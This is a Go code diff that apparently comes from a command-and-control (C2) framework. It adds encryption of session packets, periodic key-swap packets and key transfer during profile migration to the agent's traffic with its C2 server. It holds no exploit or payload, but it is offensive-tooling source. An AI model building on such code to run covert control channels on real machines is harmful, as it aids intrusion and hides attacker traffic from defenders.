@@ -56,32 +56,32 @@ var (
 // This struct does some automatic handeling and acts as the communication
 // channel between the client and server.
 type Session struct {
-	proxyState
-	lock          sync.RWMutex
-	Last, Created time.Time
+	lock   sync.RWMutex
+	keyNew *data.Key
+
+	Last    time.Time
+	Created time.Time
 	connection
 
 	swap            Profile
+	ch, wake        chan struct{}
 	parent          *Listener
 	send, recv, chn chan *com.Packet
 	frags           map[uint16]*cluster
-	// key             *[32]byte
-	// NOTE(dij) ^ for upcoming key update
+	jobs            map[uint16]*Job
 
 	Shutdown func(*Session)
 	Receive  func(*Session, *com.Packet)
-	wake     chan struct{}
 	proxy    *proxyBase
 	tick     *time.Ticker
-	jobs     map[uint16]*Job
 	peek     *com.Packet
-
-	ch   chan struct{}
-	host container
+	host     container
+	proxyState
 
 	Device device.Machine
 	sleep  time.Duration
 	state  state
+	key    data.Key
 
 	ID             device.ID
 	jitter, errors uint8
@@ -198,7 +198,6 @@ func (s *Session) listen() {
 			var h string
 			h, s.w, s.t = s.p.Next()
 			s.host.Set(h)
-			// NOTE(dij): Reset the error count if we switch.
 			// NOTE(dij): Actually, let's decrement it, as a random or round
 			//            robin profile would leave us here forever!
 			s.errors--
@@ -494,6 +493,9 @@ func (s *Session) queue(n *com.Packet) {
 		}
 	}
 }
+func (s *Session) keyValue() *data.Key {
+	return &s.key
+}
 
 // Time returns the value for the timeout period between C2 Server connections.
 func (s *Session) Time() time.Duration {
@@ -527,10 +529,10 @@ func (s *Session) channelRead(x net.Conn) {
 			}
 			break
 		}
-		if cout.Enabled {
+		// KeyCrypt: Decrypt incoming Packet here to be read.
+		if n.Crypt(&s.key); cout.Enabled {
 			s.log.Debug("[%s:C->S:R] %s: Received a Packet %q.", s.ID, s.host, n)
 		}
-		// TODO(dij): Decrypt Here (if s.key != nil)
 		if err = receive(s, s.parent, n); err != nil {
 			if cout.Enabled {
 				s.log.Warning("[%s:C->S:R] %s: Error processing Packet data: %s!", s.ID, s.host, err)
@@ -563,9 +565,12 @@ func (s *Session) channelWrite(x net.Conn) {
 		if s.state.ChannelCanStop() {
 			n.Flags |= com.FlagChannelEnd
 		}
-		if cout.Enabled {
+		// KeyCrypt: Encrpt new Packet here to be sent.
+		if n.Crypt(&s.key); cout.Enabled {
 			s.log.Debug("[%s:C->S:W] %s: Sending Packet %q.", s.ID, s.host, n)
 		}
+		// KeyCrypt: "next" was called, check for a Key Swap.
+		s.keyCheck()
 		if err := writePacket(x, s.w, s.t, n); err != nil {
 			if n.Clear(); cout.Enabled {
 				if errors.Is(err, net.ErrClosed) {
@@ -600,9 +605,12 @@ func (s *Session) session(c net.Conn) bool {
 		}
 		s.state.Set(stateChannel)
 	}
-	if cout.Enabled {
+	// KeyCrypt: Encrpt new Packet here to be sent.
+	if n.Crypt(&s.key); cout.Enabled {
 		s.log.Debug("[%s] %s: Sending Packet %q.", s.ID, s.host, n)
 	}
+	// KeyCrypt: "next" was called, check for a Key Swap.
+	s.keyCheck()
 	err := writePacket(c, s.w, s.t, n)
 	if n.Clear(); err != nil {
 		if cout.Enabled {
@@ -620,7 +628,8 @@ func (s *Session) session(c net.Conn) bool {
 		}
 		return false
 	}
-	if n.Flags&com.FlagChannel != 0 && !s.state.Channel() {
+	// KeyCrypt: Decrypt incoming Packet here to be read.
+	if n.Crypt(&s.key); n.Flags&com.FlagChannel != 0 && !s.state.Channel() {
 		if s.state.Set(stateChannel); cout.Enabled {
 			s.log.Trace("[%s] %s: Enabling Channel as received Packet has a Channel flag!", s.ID, s.host)
 		}
@@ -667,7 +676,13 @@ func (s *Session) pick(i bool) *com.Packet {
 				defer bugtrack.Recover("c2.Session.pick.func1()")
 			}
 			if s.wait(); atomic.LoadUint32(&o) == 0 {
-				s.send <- &com.Packet{Device: s.ID}
+				if s.doNextKeySwap() {
+					n := &com.Packet{Device: s.ID, Flags: com.FlagCrypt}
+					n.Write((*s.keyNew)[:])
+					s.send <- n
+				} else {
+					s.send <- &com.Packet{Device: s.ID}
+				}
 			}
 		}()
 		n := <-s.send
@@ -675,6 +690,11 @@ func (s *Session) pick(i bool) *com.Packet {
 		return n
 	case i:
 		return nil
+	}
+	if s.doNextKeySwap() {
+		n := &com.Packet{Device: s.ID, Flags: com.FlagCrypt}
+		n.Write((*s.keyNew)[:])
+		return n
 	}
 	return &com.Packet{Device: s.ID}
 }
@@ -1251,6 +1271,12 @@ func (s *Session) MigrateProfile(wait bool, n string, b []byte, job uint16, t ti
 		return 0, err
 	}
 	if err = s.writeProxyInfo(w, &buf); err != nil {
+		c.Close()
+		s.state.Unset(stateMoving)
+		s.lock.Unlock()
+		return 0, err
+	}
+	if _, err = w.Write(s.key[:]); err != nil {
 		c.Close()
 		s.state.Unset(stateMoving)
 		s.lock.Unlock()
